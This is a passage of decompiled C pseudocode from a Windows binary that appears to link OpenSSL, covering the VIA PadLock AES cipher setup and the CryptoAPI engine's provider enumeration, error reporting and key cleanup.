    v17[2] = v5[2];
    v17[3] = v5[3];
  }
  return 1;
}
// 43CC6E: variable 'v13' is possibly undefined

//----- (0043CD00) --------------------------------------------------------
void __cdecl sub_43CD00(int a1, int a2, char a3, _DWORD *a4, _DWORD *a5)
{
  *a4 = *a5;
  a4[1] = a5[1];
  a4[2] = a5[2];
  a4[3] = a5[3];
  sub_461AD0(a2, a1, (int)a4, 16 * a3);
}

//----- (0043CD40) --------------------------------------------------------
int __cdecl sub_43CD40(int C, _BYTE *a2, _BYTE *a3, int a4)
{
  int v4; // edi
  int v5; // ebx
  int v6; // eax
  _DWORD *v8; // [esp-Ch] [ebp-1Ch]
  int v9; // [esp+Ch] [ebp-4h] BYREF

  v4 = -sub_4073F0(C) & 0xF;
  v5 = v4 + sub_4073F0(C);
  v9 = sub_407450(C);
  v8 = (_DWORD *)sub_407440(C);
  v6 = _tolower(C);
  sub_413270(a3, a2, a4, v5, v6, v8, &v9, (void (__cdecl *)(_DWORD *, _DWORD *, unsigned int, int, int))sub_43CD00);
  sub_407460(C, v9);
  return 1;
}

//----- (0043CDC0) --------------------------------------------------------
int __cdecl sub_43CDC0(int a1, _DWORD *a2, int a3, int a4)
{
  int v4; // ebx
  FILE *v5; // eax
  int v7; // edi
  _DWORD *v8; // esi
  unsigned int v9; // ecx
  int v10; // [esp+8h] [ebp-4h]

  v4 = 8 * sub_407470(a1);
  v5 = (FILE *)sub_435D30(a1);
  v10 = _fileno(v5) & 0xF0007;
  if ( !a2 )
    return 0;
  v7 = -sub_4073F0(a1) & 0xF;
  v8 = (_DWORD *)(v7 + sub_4073F0(a1));
  memset(v8, 0, 0x114u);
  if ( v10 == 4 || v10 == 5 )
    v8[4] &= ~0x200u;
  else
    v8[4] ^= (v8[4] ^ ((sub_432B60(a1) == 0) << 9)) & 0x200;
  v9 = v8[4] & 0xFFFFF3F0 | ((unsigned __int8)((v4 - 128) / 32) - 6) & 0xF | ((((v4 - 128) / 64) & 3) << 10);
  v8[4] = v9;
  if ( v4 == 128 )
  {
    v8[8] = *a2;
    v8[9] = a2[1];
    v8[10] = a2[2];
    v8[11] = a2[3];
    v8[4] = v9 & 0xFFFFFF7F;
    sub_461370();
    return 1;
  }
  else if ( v4 == 192 || v4 == 256 )
  {
    if ( (v10 == 1 || v10 == 2) && !a4 )
    {
      sub_4117E0(a2, v4, v8 + 8);
      v8[4] |= 0x80u;
      sub_461370();
      return 1;
    }
    else
    {
      sub_4117D0(a2, v4, v8 + 8);
      v8[4] |= 0x80u;
      sub_461370();
      return 1;
    }
  }
  else
  {
    return 0;
  }
}
// 4117D0: using guessed type int __cdecl sub_4117D0(_DWORD, _DWORD, _DWORD);
// 4117E0: using guessed type _DWORD __cdecl sub_4117E0(_DWORD, _DWORD, _DWORD);

//----- (0043CF50) --------------------------------------------------------
int __cdecl sub_43CF50(_BYTE *a1, int a2)
{
  int v2; // esi
  __int16 v4; // ax
  int v5; // eax
  __int16 v6; // ax
  int v7; // eax

  v2 = a2;
  if ( a2 < 8 )
  {
LABEL_8:
    if ( v2 <= 0 )
    {
LABEL_15:
      sub_4139E0(&a2, 4u);
      return 1;
    }
    while ( 1 )
    {
      v6 = sub_461C00();
      if ( (v6 & 0x40) == 0 || (v6 & 0x7C00) != 0 )
        break;
      v7 = v6 & 0x1F;
      if ( v7 )
      {
        if ( v7 != 1 )
          return 0;
        *a1++ = a2;
        --v2;
      }
      if ( v2 <= 0 )
        goto LABEL_15;
    }
  }
  else
  {
    while ( 1 )
    {
      v4 = sub_461C00();
      if ( (v4 & 0x40) == 0 || (v4 & 0x7C00) != 0 )
        break;
      v5 = v4 & 0x1F;
      if ( v5 )
      {
        if ( v5 != 8 )
          return 0;
        a1 += 8;
        v2 -= 8;
      }
      if ( v2 < 8 )
        goto LABEL_8;
    }
  }
  return 0;
}

//----- (0043CFF0) --------------------------------------------------------
int sub_43CFF0()
{
  int result; // eax
  _DWORD *v1; // eax

  result = dword_539154;
  if ( !dword_539154 )
  {
    v1 = sub_460C00(418, 16, 16);
    dword_539154 = (int)v1;
    if ( !v1 )
    {
LABEL_11:
      sub_460C30(v1);
      result = 0;
      dword_539154 = 0;
      return result;
    }
    if ( !sub_461FD0((int)v1, 16)
      || !sub_407520(dword_539154, 1)
      || !sub_407540(dword_539154, (int)sub_43CDC0)
      || !sub_407560(dword_539154, (int)sub_43C8F0)
      || !sub_444000(dword_539154, 292)
      || !sub_460C50(dword_539154, (int)sub_407650)
      || !sub_407500(dword_539154, (int)sub_4075E0) )
    {
      v1 = (_DWORD *)dword_539154;
      goto LABEL_11;
    }
    return dword_539154;
  }
  return result;
}
// 539154: using guessed type int dword_539154;

//----- (0043D0E0) --------------------------------------------------------
int sub_43D0E0()
{
  int result; // eax
  _DWORD *v1; // eax

  result = dword_539158;
  if ( !dword_539158 )
  {
    v1 = sub_460C00(419, 16, 16);
    dword_539158 = (int)v1;
    if ( !v1 )
    {
LABEL_11:
      sub_460C30(v1);
      result = 0;
      dword_539158 = 0;
      return result;
    }
    if ( !sub_461FD0((int)v1, 16)
      || !sub_407520(dword_539158, 2)
      || !sub_407540(dword_539158, (int)sub_43CDC0)
      || !sub_407560(dword_539158, (int)sub_43C930)
      || !sub_444000(dword_539158, 292)
      || !sub_460C50(dword_539158, (int)sub_407650)
      || !sub_407500(dword_539158, (int)sub_4075E0) )
    {
      v1 = (_DWORD *)dword_539158;
      goto LABEL_11;
    }
    return dword_539158;
  }
  return result;
}
// 539158: using guessed type int dword_539158;

//----- (0043D1D0) --------------------------------------------------------
int sub_43D1D0()
{
  int result; // eax
  _DWORD *v1; // eax

  result = dword_53915C;
  if ( !dword_53915C )
  {
    v1 = sub_460C00(421, 1, 16);
    dword_53915C = (int)v1;
    if ( !v1 )
    {
LABEL_11:
      sub_460C30(v1);
      result = 0;
      dword_53915C = 0;
      return result;
    }
    if ( !sub_461FD0((int)v1, 16)
      || !sub_407520(dword_53915C, 3)
      || !sub_407540(dword_53915C, (int)sub_43CDC0)
      || !sub_407560(dword_53915C, (int)sub_43C9B0)
      || !sub_444000(dword_53915C, 292)
      || !sub_460C50(dword_53915C, (int)sub_407650)
      || !sub_407500(dword_53915C, (int)sub_4075E0) )
    {
      v1 = (_DWORD *)dword_53915C;
      goto LABEL_11;
    }
    return dword_53915C;
  }
  return result;
}
// 43C9B0: using guessed type int sub_43C9B0();
// 53915C: using guessed type int dword_53915C;

//----- (0043D2C0) --------------------------------------------------------
int sub_43D2C0()
{
  int result; // eax
  _DWORD *v1; // eax

  result = dword_539160;
  if ( !dword_539160 )
  {
    v1 = sub_460C00(420, 1, 16);
    dword_539160 = (int)v1;
    if ( !v1 )
    {
LABEL_11:
      sub_460C30(v1);
      result = 0;
      dword_539160 = 0;
      return result;
    }
    if ( !sub_461FD0((int)v1, 16)
      || !sub_407520(dword_539160, 4)
      || !sub_407540(dword_539160, (int)sub_43CDC0)
      || !sub_407560(dword_539160, (int)sub_43CBA0)
      || !sub_444000(dword_539160, 292)
      || !sub_460C50(dword_539160, (int)sub_407650)
      || !sub_407500(dword_539160, (int)sub_4075E0) )
    {
      v1 = (_DWORD *)dword_539160;
      goto LABEL_11;
    }
    return dword_539160;
  }
  return result;
}
// 539160: using guessed type int dword_539160;

//----- (0043D3B0) --------------------------------------------------------
int sub_43D3B0()
{
  int result; // eax
  _DWORD *v1; // eax

  result = dword_539164;
  if ( !dword_539164 )
  {
    v1 = sub_460C00(904, 1, 16);
    dword_539164 = (int)v1;
    if ( !v1 )
    {
LABEL_11:
      sub_460C30(v1);
      result = 0;
      dword_539164 = 0;
      return result;
    }
    if ( !sub_461FD0((int)v1, 16)
      || !sub_407520(dword_539164, 5)
      || !sub_407540(dword_539164, (int)sub_43CDC0)
      || !sub_407560(dword_539164, (int)sub_43CD40)
      || !sub_444000(dword_539164, 292)
      || !sub_460C50(dword_539164, (int)sub_407650)
      || !sub_407500(dword_539164, (int)sub_4075E0) )
    {
      v1 = (_DWORD *)dword_539164;
      goto LABEL_11;
    }
    return dword_539164;
  }
  return result;
}
// 539164: using guessed type int dword_539164;

//----- (0043D4A0) --------------------------------------------------------
int sub_43D4A0()
{
  int result; // eax
  _DWORD *v1; // eax

  result = dword_539168;
  if ( !dword_539168 )
  {
    v1 = sub_460C00(422, 16, 24);
    dword_539168 = (int)v1;
    if ( !v1 )
    {
LABEL_11:
      sub_460C30(v1);
      result = 0;
      dword_539168 = 0;
      return result;
    }
    if ( !sub_461FD0((int)v1, 16)
      || !sub_407520(dword_539168, 1)
      || !sub_407540(dword_539168, (int)sub_43CDC0)
      || !sub_407560(dword_539168, (int)sub_43C8F0)
      || !sub_444000(dword_539168, 292)
      || !sub_460C50(dword_539168, (int)sub_407650)
      || !sub_407500(dword_539168, (int)sub_4075E0) )
    {
      v1 = (_DWORD *)dword_539168;
      goto LABEL_11;
    }
    return dword_539168;
  }
  return result;
}
// 539168: using guessed type int dword_539168;

//----- (0043D590) --------------------------------------------------------
int sub_43D590()
{
  int result; // eax
  _DWORD *v1; // eax

  result = dword_53916C;
  if ( !dword_53916C )
  {
    v1 = sub_460C00(423, 16, 24);
    dword_53916C = (int)v1;
    if ( !v1 )
    {
LABEL_11:
      sub_460C30(v1);
      result = 0;
      dword_53916C = 0;
      return result;
    }
    if ( !sub_461FD0((int)v1, 16)
      || !sub_407520(dword_53916C, 2)
      || !sub_407540(dword_53916C, (int)sub_43CDC0)
      || !sub_407560(dword_53916C, (int)sub_43C930)
      || !sub_444000(dword_53916C, 292)
      || !sub_460C50(dword_53916C, (int)sub_407650)
      || !sub_407500(dword_53916C, (int)sub_4075E0) )
    {
      v1 = (_DWORD *)dword_53916C;
      goto LABEL_11;
    }
    return dword_53916C;
  }
  return result;
}
// 53916C: using guessed type int dword_53916C;

//----- (0043D680) --------------------------------------------------------
int sub_43D680()
{
  int result; // eax
  _DWORD *v1; // eax

  result = dword_539170;
  if ( !dword_539170 )
  {
    v1 = sub_460C00(425, 1, 24);
    dword_539170 = (int)v1;
    if ( !v1 )
    {
LABEL_11:
      sub_460C30(v1);
      result = 0;
      dword_539170 = 0;
      return result;
    }
    if ( !sub_461FD0((int)v1, 16)
      || !sub_407520(dword_539170, 3)
      || !sub_407540(dword_539170, (int)sub_43CDC0)
      || !sub_407560(dword_539170, (int)sub_43C9B0)
      || !sub_444000(dword_539170, 292)
      || !sub_460C50(dword_539170, (int)sub_407650)
      || !sub_407500(dword_539170, (int)sub_4075E0) )
    {
      v1 = (_DWORD *)dword_539170;
      goto LABEL_11;
    }
    return dword_539170;
  }
  return result;
}
// 43C9B0: using guessed type int sub_43C9B0();
// 539170: using guessed type int dword_539170;

//----- (0043D770) --------------------------------------------------------
int sub_43D770()
{
  int result; // eax
  _DWORD *v1; // eax

  result = dword_539174;
  if ( !dword_539174 )
  {
    v1 = sub_460C00(424, 1, 24);
    dword_539174 = (int)v1;
    if ( !v1 )
    {
LABEL_11:
      sub_460C30(v1);
      result = 0;
      dword_539174 = 0;
      return result;
    }
    if ( !sub_461FD0((int)v1, 16)
      || !sub_407520(dword_539174, 4)
      || !sub_407540(dword_539174, (int)sub_43CDC0)
      || !sub_407560(dword_539174, (int)sub_43CBA0)
      || !sub_444000(dword_539174, 292)
      || !sub_460C50(dword_539174, (int)sub_407650)
      || !sub_407500(dword_539174, (int)sub_4075E0) )
    {
      v1 = (_DWORD *)dword_539174;
      goto LABEL_11;
    }
    return dword_539174;
  }
  return result;
}
// 539174: using guessed type int dword_539174;

//----- (0043D860) --------------------------------------------------------
int sub_43D860()
{
  int result; // eax
  _DWORD *v1; // eax

  result = dword_539178;
  if ( !dword_539178 )
  {
    v1 = sub_460C00(905, 1, 24);
    dword_539178 = (int)v1;
    if ( !v1 )
    {
LABEL_11:
      sub_460C30(v1);
      result = 0;
      dword_539178 = 0;
      return result;
    }
    if ( !sub_461FD0((int)v1, 16)
      || !sub_407520(dword_539178, 5)
      || !sub_407540(dword_539178, (int)sub_43CDC0)
      || !sub_407560(dword_539178, (int)sub_43CD40)
      || !sub_444000(dword_539178, 292)
      || !sub_460C50(dword_539178, (int)sub_407650)
      || !sub_407500(dword_539178, (int)sub_4075E0) )
    {
      v1 = (_DWORD *)dword_539178;
      goto LABEL_11;
    }
    return dword_539178;
  }
  return result;
}
// 539178: using guessed type int dword_539178;

//----- (0043D950) --------------------------------------------------------
int sub_43D950()
{
  int result; // eax
  _DWORD *v1; // eax

  result = dword_53917C;
  if ( !dword_53917C )
  {
    v1 = sub_460C00(426, 16, 32);
    dword_53917C = (int)v1;
    if ( !v1 )
    {
LABEL_11:
      sub_460C30(v1);
      result = 0;
      dword_53917C = 0;
      return result;
    }
    if ( !sub_461FD0((int)v1, 16)
      || !sub_407520(dword_53917C, 1)
      || !sub_407540(dword_53917C, (int)sub_43CDC0)
      || !sub_407560(dword_53917C, (int)sub_43C8F0)
      || !sub_444000(dword_53917C, 292)
      || !sub_460C50(dword_53917C, (int)sub_407650)
      || !sub_407500(dword_53917C, (int)sub_4075E0) )
    {
      v1 = (_DWORD *)dword_53917C;
      goto LABEL_11;
    }
    return dword_53917C;
  }
  return result;
}
// 53917C: using guessed type int dword_53917C;

//----- (0043DA40) --------------------------------------------------------
int sub_43DA40()
{
  int result; // eax
  _DWORD *v1; // eax

  result = dword_539180;
  if ( !dword_539180 )
  {
    v1 = sub_460C00(427, 16, 32);
    dword_539180 = (int)v1;
    if ( !v1 )
    {
LABEL_11:
      sub_460C30(v1);
      result = 0;
      dword_539180 = 0;
      return result;
    }
    if ( !sub_461FD0((int)v1, 16)
      || !sub_407520(dword_539180, 2)
      || !sub_407540(dword_539180, (int)sub_43CDC0)
      || !sub_407560(dword_539180, (int)sub_43C930)
      || !sub_444000(dword_539180, 292)
      || !sub_460C50(dword_539180, (int)sub_407650)
      || !sub_407500(dword_539180, (int)sub_4075E0) )
    {
      v1 = (_DWORD *)dword_539180;
      goto LABEL_11;
    }
    return dword_539180;
  }
  return result;
}
// 539180: using guessed type int dword_539180;

//----- (0043DB30) --------------------------------------------------------
int sub_43DB30()
{
  int result; // eax
  _DWORD *v1; // eax

  result = dword_539184;
  if ( !dword_539184 )
  {
    v1 = sub_460C00(429, 1, 32);
    dword_539184 = (int)v1;
    if ( !v1 )
    {
LABEL_11:
      sub_460C30(v1);
      result = 0;
      dword_539184 = 0;
      return result;
    }
    if ( !sub_461FD0((int)v1, 16)
      || !sub_407520(dword_539184, 3)
      || !sub_407540(dword_539184, (int)sub_43CDC0)
      || !sub_407560(dword_539184, (int)sub_43C9B0)
      || !sub_444000(dword_539184, 292)
      || !sub_460C50(dword_539184, (int)sub_407650)
      || !sub_407500(dword_539184, (int)sub_4075E0) )
    {
      v1 = (_DWORD *)dword_539184;
      goto LABEL_11;
    }
    return dword_539184;
  }
  return result;
}
// 43C9B0: using guessed type int sub_43C9B0();
// 539184: using guessed type int dword_539184;

//----- (0043DC20) --------------------------------------------------------
int sub_43DC20()
{
  int result; // eax
  _DWORD *v1; // eax

  result = dword_539188;
  if ( !dword_539188 )
  {
    v1 = sub_460C00(428, 1, 32);
    dword_539188 = (int)v1;
    if ( !v1 )
    {
LABEL_11:
      sub_460C30(v1);
      result = 0;
      dword_539188 = 0;
      return result;
    }
    if ( !sub_461FD0((int)v1, 16)
      || !sub_407520(dword_539188, 4)
      || !sub_407540(dword_539188, (int)sub_43CDC0)
      || !sub_407560(dword_539188, (int)sub_43CBA0)
      || !sub_444000(dword_539188, 292)
      || !sub_460C50(dword_539188, (int)sub_407650)
      || !sub_407500(dword_539188, (int)sub_4075E0) )
    {
      v1 = (_DWORD *)dword_539188;
      goto LABEL_11;
    }
    return dword_539188;
  }
  return result;
}
// 539188: using guessed type int dword_539188;

//----- (0043DD10) --------------------------------------------------------
int sub_43DD10()
{
  int result; // eax
  _DWORD *v1; // eax

  result = dword_53918C;
  if ( !dword_53918C )
  {
    v1 = sub_460C00(906, 1, 32);
    dword_53918C = (int)v1;
    if ( !v1 )
    {
LABEL_11:
      sub_460C30(v1);
      result = 0;
      dword_53918C = 0;
      return result;
    }
    if ( !sub_461FD0((int)v1, 16)
      || !sub_407520(dword_53918C, 5)
      || !sub_407540(dword_53918C, (int)sub_43CDC0)
      || !sub_407560(dword_53918C, (int)sub_43CD40)
      || !sub_444000(dword_53918C, 292)
      || !sub_460C50(dword_53918C, (int)sub_407650)
      || !sub_407500(dword_53918C, (int)sub_4075E0) )
    {
      v1 = (_DWORD *)dword_53918C;
      goto LABEL_11;
    }
    return dword_53918C;
  }
  return result;
}
// 53918C: using guessed type int dword_53918C;

//----- (0043DE00) --------------------------------------------------------
int __cdecl sub_43DE00(int a1, int *a2, _DWORD *a3, int a4)
{
  int result; // eax

  if ( a2 )
  {
    if ( a4 > 904 )
    {
      if ( a4 == 905 )
      {
        *a2 = sub_43D860();
        return 1;
      }
      else if ( a4 == 906 )
      {
        *a2 = sub_43DD10();
        return 1;
      }
      else
      {
LABEL_21:
        *a2 = 0;
        return 0;
      }
    }
    else if ( a4 == 904 )
    {
      *a2 = sub_43D3B0();
      return 1;
    }
    else
    {
      switch ( a4 )
      {
        case 418:
          *a2 = sub_43CFF0();
          result = 1;
          break;
        case 419:
          *a2 = sub_43D0E0();
          result = 1;
          break;
        case 420:
          *a2 = sub_43D2C0();
          result = 1;
          break;
        case 421:
          *a2 = sub_43D1D0();
          result = 1;
          break;
        case 422:
          *a2 = sub_43D4A0();
          result = 1;
          break;
        case 423:
          *a2 = sub_43D590();
          result = 1;
          break;
        case 424:
          *a2 = sub_43D770();
          result = 1;
          break;
        case 425:
          *a2 = sub_43D680();
          result = 1;
          break;
        case 426:
          *a2 = sub_43D950();
          result = 1;
          break;
        case 427:
          *a2 = sub_43DA40();
          result = 1;
          break;
        case 428:
          *a2 = sub_43DC20();
          result = 1;
          break;
        case 429:
          *a2 = sub_43DB30();
          result = 1;
          break;
        default:
          goto LABEL_21;
      }
    }
  }
  else
  {
    *a3 = &unk_50BC2C;
    return dword_5314A8;
  }
  return result;
}
// 5314A8: using guessed type int dword_5314A8;

//----- (0043DF60) --------------------------------------------------------
BOOL __usercall sub_43DF60@<eax>(_DWORD *a1@<esi>)
{
  char v1; // al

  v1 = sub_461280();
  dword_539150 = 0;
  dword_53914C = (v1 & 0xC0) == 0xC0;
  sub_4191B0((int)&unk_5390E8, 100, "VIA PadLock (%s, %s)", (int)"no-RNG");
  return sub_42A0F0(a1, (int)off_5314A4)
      && sub_42A130((int)a1, (int)&unk_5390E8)
      && sub_42A170((int)a1, (int)sub_43C8D0)
      && (!dword_53914C || sub_461EF0((int)a1, (int)sub_43DE00))
      && (!dword_539150 || sub_407560((int)a1, (int)&unk_5314AC));
}
// 5314A4: using guessed type char *off_5314A4;
// 53914C: using guessed type int dword_53914C;
// 539150: using guessed type int dword_539150;

//----- (0043E020) --------------------------------------------------------
volatile LONG *sub_43E020()
{
  volatile LONG *result; // eax
  volatile LONG *v1; // esi

  result = (volatile LONG *)sub_42A240();
  v1 = result;
  if ( result )
  {
    if ( sub_43DF60(result) )
    {
      sub_42B560(v1);
      sub_429F60(v1);
      return (volatile LONG *)sub_408400();
    }
    else
    {
      return (volatile LONG *)sub_429F60(v1);
    }
  }
  return result;
}

//----- (0043E060) --------------------------------------------------------
int sub_43E060()
{
  int result; // eax

  result = dword_539190;
  if ( !dword_539190 )
  {
    result = sub_408040();
    dword_539190 = result;
  }
  if ( dword_531668 )
  {
    dword_531668 = 0;
    sub_407CD0(result, &dword_5314C8);
    return sub_407CD0(dword_539190, &dword_531570);
  }
  return result;
}
// 5314C8: using guessed type _DWORD dword_5314C8;
// 531570: using guessed type _DWORD dword_531570;
// 531668: using guessed type int dword_531668;
// 539190: using guessed type int dword_539190;

//----- (0043E0B0) --------------------------------------------------------
int __cdecl sub_43E0B0(__int16 a1, __int16 a2, int a3, int a4)
{
  int v4; // eax

  v4 = dword_539190;
  if ( !dword_539190 )
  {
    v4 = sub_408040();
    dword_539190 = v4;
  }
  return sub_408310(v4, a1, a2, a3, a4);
}
// 539190: using guessed type int dword_539190;

//----- (0043E0F0) --------------------------------------------------------
int sub_43E0F0()
{
  int result; // eax

  sub_461F80((void **)dword_539194);
  dword_539194 = 0;
  sub_461EC0((void **)dword_539198);
  dword_539198 = 0;
  if ( dword_531668 )
    return 1;
  sub_407CF0(dword_539190, &dword_5314C8);
  sub_407CF0(dword_539190, &dword_531570);
  result = 1;
  dword_531668 = 1;
  return result;
}
// 5314C8: using guessed type _DWORD dword_5314C8;
// 531570: using guessed type _DWORD dword_531570;
// 531668: using guessed type int dword_531668;
// 539190: using guessed type int dword_539190;

//----- (0043E160) --------------------------------------------------------
BOOL __usercall sub_43E160@<eax>(_BYTE *a1@<edi>, int a2, int a3)
{
  int v3; // ecx
  _BYTE *v4; // edx
  char v5; // al

  v3 = 0;
  if ( a3 / 2 > 0 )
  {
    v4 = &a1[a3 - 1];
    do
    {
      v5 = a1[v3];
      a1[v3] = *v4;
      *v4 = v5;
      ++v3;
      --v4;
    }
    while ( v3 < a3 / 2 );
  }
  return sub_4174D0(a1, a3, a2) != 0;
}

//----- (0043E1B0) --------------------------------------------------------
int sub_43E1B0()
{
  int v0; // eax

  v0 = dword_539190;
  if ( !dword_539190 )
  {
    v0 = sub_408040();
    dword_539190 = v0;
  }
  sub_408310(v0, 111, 112, (int)"engines\\e_capi.c", 820);
  return -1;
}
// 539190: using guessed type int dword_539190;

//----- (0043E1E0) --------------------------------------------------------
const CHAR *__cdecl sub_43E1E0(const CHAR *a1, int a2, char *a3, int *a4)
{
  const CHAR *result; // eax
  volatile LONG *v5; // esi

  result = a1;
  if ( a1 )
  {
    if ( *(_DWORD *)a1 >= a2 )
    {
      result = (const CHAR *)*((_DWORD *)a1 + 1);
      if ( result )
      {
        v5 = sub_4196B0(result, "a+");
        if ( v5 )
        {
          sub_419090((int)v5, a3, a4);
          return (const CHAR *)sub_404F50(v5);
        }
        else
        {
          return (const CHAR *)sub_43E0B0(118, 128, (int)"engines\\e_capi.c", 1071);
        }
      }
    }
  }
  return result;
}

//----- (0043E250) --------------------------------------------------------
const CHAR *__usercall sub_43E250@<eax>(const CHAR *a1@<edx>, char *a2, ...)
{
  va_list va; // [esp+8h] [ebp+8h] BYREF

  va_start(va, a2);
  return sub_43E1E0(a1, 2, a2, (int *)va);
}

//----- (0043E270) --------------------------------------------------------
void __cdecl sub_43E270(int a1)
{
  char v1[12]; // [esp+0h] [ebp-10h] BYREF

  sub_4191B0((int)v1, 10, "%lX", a1);
  sub_408610(2, "Error code= 0x", v1);
}

//----- (0043E2C0) --------------------------------------------------------
CHAR *__cdecl sub_43E2C0(LPCWCH lpWideCharStr)
{
  int v2; // edi
  int v3; // eax
  int v4; // esi
  int v5; // eax
  CHAR *v6; // eax
  CHAR *v7; // ebx
  int v8; // eax

  if ( !lpWideCharStr )
    return 0;
  v2 = wcslen(lpWideCharStr) + 1;
  v3 = WideCharToMultiByte(0, 0, lpWideCharStr, v2, 0, 0, 0, 0);
  v4 = v3;
  if ( v3 )
  {
    v6 = (CHAR *)sub_4133F0(v3);
    v7 = v6;
    if ( v6 )
    {
      if ( WideCharToMultiByte(0, 0, lpWideCharStr, v2, v6, v4, 0, 0) )
      {
        return v7;
      }
      else
      {
        sub_413490(v7);
        sub_43E0B0(113, 127, (int)"engines\\e_capi.c", 1118);
        return 0;
      }
    }
    else
    {
      v8 = dword_539190;
      if ( !dword_539190 )
      {
        v8 = sub_408040();
        dword_539190 = v8;
      }
      sub_408310(v8, 113, 65, (int)"engines\\e_capi.c", 1113);
      return 0;
    }
  }
  else
  {
    v5 = dword_539190;
    if ( !dword_539190 )
    {
      v5 = sub_408040();
      dword_539190 = v5;
    }
    sub_408310(v5, 113, 127, (int)"engines\\e_capi.c", 1108);
    return 0;
  }
}
// 539190: using guessed type int dword_539190;

//----- (0043E3D0) --------------------------------------------------------
int __usercall sub_43E3D0@<eax>(DWORD a1@<ecx>, DWORD *a2@<ebx>, const CHAR *a3, const char **a4)
{
  int LastError; // esi
  int v7; // eax
  WCHAR *v8; // eax
  WCHAR *v9; // esi
  int v10; // eax
  int v11; // edi
  DWORD pcbProvName; // [esp+Ch] [ebp-4h] BYREF

  sub_43E250(a3, "capi_get_provname, index=%d\n", a1);
  if ( !CryptEnumProvidersW(a1, 0, 0, a2, 0, &pcbProvName) )
  {
    LastError = GetLastError();
    if ( LastError == 259 )
      return 2;
    v7 = dword_539190;
    if ( !dword_539190 )
    {
      v7 = sub_408040();
      dword_539190 = v7;
    }
    sub_408310(v7, 104, 104, (int)"engines\\e_capi.c", 1134);
    sub_43E270(LastError);
    return 0;
  }
  v8 = (WCHAR *)sub_4133F0(pcbProvName);
  v9 = v8;
  if ( v8 )
  {
    if ( CryptEnumProvidersW(a1, 0, 0, a2, v8, &pcbProvName) )
    {
      *a4 = sub_43E2C0(v9);
      sub_413490(v9);
      if ( !*a4 )
        return 0;
      sub_43E250(a3, "capi_get_provname, returned name=%s, type=%d\n", *a4, *a2);
      return 1;
    }
    else
    {
      v11 = GetLastError();
      sub_413490(v9);
      if ( v11 == 259 )
        return 2;
      sub_43E0B0(104, 104, (int)"engines\\e_capi.c", 1148);
      sub_43E270(v11);
      return 0;
    }
  }
  else
  {
    v10 = dword_539190;
    if ( !dword_539190 )
    {
      v10 = sub_408040();
      dword_539190 = v10;
    }
    sub_408310(v10, 104, 65, (int)"engines\\e_capi.c", 1140);
    return 0;
  }
}
// 539190: using guessed type int dword_539190;

//----- (0043E550) --------------------------------------------------------
int __cdecl sub_43E550(const CHAR *a1, int a2)
{
  int v2; // esi
  int i; // eax
  void *v4; // edi
  void *Block; // [esp+Ch] [ebp-8h] BYREF
  DWORD v7; // [esp+10h] [ebp-4h] BYREF

  v2 = 0;
  Block = 0;
  sub_43E250(a1, "capi_list_providers\n");
  sub_419190(a2, "Available CSPs:\n");
  for ( i = sub_43E3D0(0, &v7, a1, (const char **)&Block); i != 2; i = sub_43E3D0(++v2, &v7, a1, (const char **)&Block) )
  {
    if ( !i )
      break;
    v4 = Block;
    sub_419190(a2, "%lu. %s, type %lu\n", v2, (const char *)Block, v7);
    sub_413490(v4);
  }
  return 1;
}

//----- (0043E600) --------------------------------------------------------
void __usercall sub_43E600(int a1@<esi>, int a2)
{
  CHAR *v2; // edi
  CHAR *v3; // eax
  char *v4; // ebx

  if ( a1 )
  {
    v2 = sub_43E2C0(*(LPCWCH *)(a1 + 4));
    v3 = sub_43E2C0(*(LPCWCH *)a1);
    v4 = v3;
    if ( v2 )
    {
      if ( v3 )
      {
        sub_419190(a2, "  Private Key Info:\n");
        sub_419190(a2, "    Provider Name:  %s, Provider Type %lu\n", v2, *(_DWORD *)(a1 + 8));
        sub_419190(a2, "    Container Name: %s, Key Type %lu\n", v4, *(_DWORD *)(a1 + 24));
      }
    }
    sub_413490(v2);
    sub_413490(v4);
  }
  else
  {
    sub_419190(a2, "  No Private Key\n");
  }
}

//----- (0043E690) --------------------------------------------------------
void __cdecl sub_43E690(PCCERT_CONTEXT *Block)
{
  if ( Block )
  {
    CryptDestroyKey((HCRYPTKEY)Block[2]);
    CryptReleaseContext((HCRYPTPROV)Block[1], 0);
    if ( *Block )
      CertFreeCertificateContext(*Block);
    sub_413490(Block);
  }
}

//----- (0043E6E0) --------------------------------------------------------
void __usercall sub_43E6E0(int a1@<esi>)
{
  int v1; // [esp+0h] [ebp-4h]

  sub_43E250((const CHAR *)a1, "Calling capi_ctx_free with %lx\n", v1);
  if ( a1 )
  {
    sub_413490(*(void **)(a1 + 12));
    sub_413490(*(void **)(a1 + 4));
    sub_413490(*(void **)(a1 + 20));
    sub_413490(*(void **)(a1 + 24));
    sub_413490((void *)a1);
  }
}
// 43E6E8: variable 'v1' is possibly undefined

//----- (0043E760) --------------------------------------------------------
int __usercall sub_43E760@<eax>(int *a1@<edi>, int a2)
{
  int v3; // esi
  _DWORD *v4; // ebx
  _DWORD *v5; // eax
  int v6; // [esp+0h] [ebp-8h]

  if ( sub_426A30(v6) <= 0 )
    return 1;
  v3 = 0;
  if ( sub_426A30((int)a1) <= 0 )
    return 0;
  while ( 1 )
  {
    v4 = (_DWORD *)sub_426A40(a1, v3);
    v5 = (_DWORD *)sub_432E70(a2);
    if ( !sub_432EA0(v4, v5) )
      break;
    if ( ++v3 >= sub_426A30((int)a1) )
      return 0;
  }
  return 1;
}
// 43E766: variable 'v6' is possibly undefined

//----- (0043E7D0) --------------------------------------------------------
int __cdecl sub_43E7D0(int a1)
{
  int v1; // eax

  v1 = sub_42A0E0(a1, dword_531674);
  sub_43E6E0(v1);
  sub_42A0D0(a1, dword_531674, 0);
  return 1;
}
// 531674: using guessed type int dword_531674;

//----- (0043E810) --------------------------------------------------------
int __cdecl sub_43E810(int a1)
{
  int v1; // eax
  int v2; // esi

  v1 = sub_405730(a1, dword_531678);
  v2 = v1;
  if ( v1 )
  {
    CryptDestroyKey(*(_DWORD *)(v1 + 8));
    CryptReleaseContext(*(_DWORD *)(v2 + 4), 0);
    if ( *(_DWORD *)v2 )
      CertFreeCertificateContext(*(PCCERT_CONTEXT *)v2);
    sub_413490((void *)v2);
  }
  sub_405720(a1, dword_531678, 0);
  return 1;
}
// 531678: using guessed type int dword_531678;

//----- (0043E880) --------------------------------------------------------
int __cdecl sub_43E880(int a1)
{
  int v1; // eax
  int v2; // esi

  v1 = sub_41D720(a1, dword_53167C);
  v2 = v1;
  if ( v1 )
  {
    CryptDestroyKey(*(_DWORD *)(v1 + 8));
    CryptReleaseContext(*(_DWORD *)(v2 + 4), 0);
    if ( *(_DWORD *)v2 )
      CertFreeCertificateContext(*(PCCERT_CONTEXT *)v2);
    sub_413490((void *)v2);
  }
